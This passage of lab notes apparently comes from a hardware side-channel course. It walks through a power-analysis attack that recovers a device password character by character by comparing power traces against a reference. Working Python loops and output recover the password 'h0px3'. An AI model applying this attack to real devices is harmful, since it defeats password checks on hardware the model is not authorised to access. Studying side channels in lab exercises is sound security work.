there will be a power spike (as normal) when a character is incorrect. The power will be low for a bit when the character is incorrect.

```python
trace_h = cap_pass_trace("h\n")
trace_l = cap_pass_trace("l\n")

%matplotlib notebook
import matplotlib.pylab as plt

plt.figure()
plt.plot(trace_h, 'r')
plt.plot(trace_l, 'b')
plt.show()
```

![[Pasted image 20230719140230.png]]
red line: h - correct character
blue line: l - incorrect character

### automating our attack

- take a character we know is wrong to use as a reference trace, for example, there is not going to be a null byte in our passcode.
	- in this instance, we know the trace for an invalid character looks the same as a trace for a valid but incorrect one.
	![[Screenshot 2023-07-19 at 2.10.20 PM.png]]
- take the difference between traces for all letters and the reference. The correct once should stand out now.

```python
%matplotlib notebook
import matplotlib.pylab as plt
samp_trace = cap_pass_trace("\x00\n")
chars = "abcdefghijklmnopqrstuvwxyz0123456789"
plt.figure()

for letter in chars:
    trace = cap_pass_trace(letter + "\n")
    plt.plot(trace - samp_trace)
    diff = np.sum(np.abs(trace - samp_trace))
    
    print(f"{letter} diff = {diff}")
    
plt.show()
```

![[Pasted image 20230719141251.png]]
we can see that the gray trace is probably the correct character.
The only issue is we don't know what character that line corresponds to

### Identifying the specific character
- to determine the specific character, we can take the absolute value of all of the differences between the referance and the trace, then sum them together. 
- The values for incorrect traces should be very small, but the values for correct traces should be large.
- you could take the mean, but every trace has the name number of samples, so it will just scale the data differently (very small!)

code
```python
%matplotlib notebook
import matplotlib.pylab as plt
import numpy as np


test_trace = cap_pass_trace("\x00\n")
chars = "abcdefghijklmnopqrstuvwxyz0123456789"

for letter in chars:
    trace = cap_pass_trace(letter + "\n")
    diff = np.sum(np.abs(trace - test_trace))
    print(f"{letter} : {diff}")
```

output
```
a : 6.8935546875
b : 8.873046875
c : 8.7314453125
d : 9.224609375
e : 12.4951171875
f : 12.740234375
g : 8.333984375
h : 126.5322265625 #We can see that h has a much higher trace than the others
i : 8.2080078125
j : 9.01953125
k : 8.2255859375
l : 8.5595703125
m : 8.46484375
n : 9.0146484375
o : 8.9619140625
p : 8.77734375
q : 8.4970703125
r : 8.9150390625
s : 8.421875
t : 9.4189453125
u : 9.01953125
v : 9.0732421875
w : 8.74609375
x : 8.625
y : 8.212890625
z : 8.921875
0 : 8.951171875
1 : 8.875
2 : 8.333984375
3 : 8.6494140625
4 : 9.4013671875
5 : 12.990234375
6 : 8.103515625
7 : 9.490234375
8 : 12.6640625
9 : 12.8447265625
```

now we can set a threshold value for the diff value correct letter. Anything above 50 should be good, but I found the difference values of the correct characters are usually above 100 so you could go higher.

```python
%matplotlib notebook
import matplotlib.pylab as plt
import numpy as np

threshold = 50.0
samp_trace = cap_pass_trace("\x00\n")
chars = "abcdefghijklmnopqrstuvwxyz0123456789"
corr_char = ""

for letter in chars:
    trace = cap_pass_trace(letter + "\n")
    diff = np.sum(np.abs(trace - samp_trace))
    if diff > threshold:
        corr_char = letter
        break
print(corr_char)
```

### running a full attack
```python
import numpy as np
threshold = 50.0
chars = "abcdefghijklmnopqrstuvwxyz0123456789"
corr_char = ""
for i in range(0, 5):
    samp_trace = cap_pass_trace(corr_char + "\x00\n")
    for letter in chars:
        trace = cap_pass_trace(corr_char + letter + "\n")
        diff = np.sum(np.abs(trace - samp_trace))
        
        if diff > threshold:
            corr_char+=letter
            print(corr_char)
            break
```
```
h
h0
h0p
h0px
h0px3
```
- checks the values for each of the 5 characters and print out the password

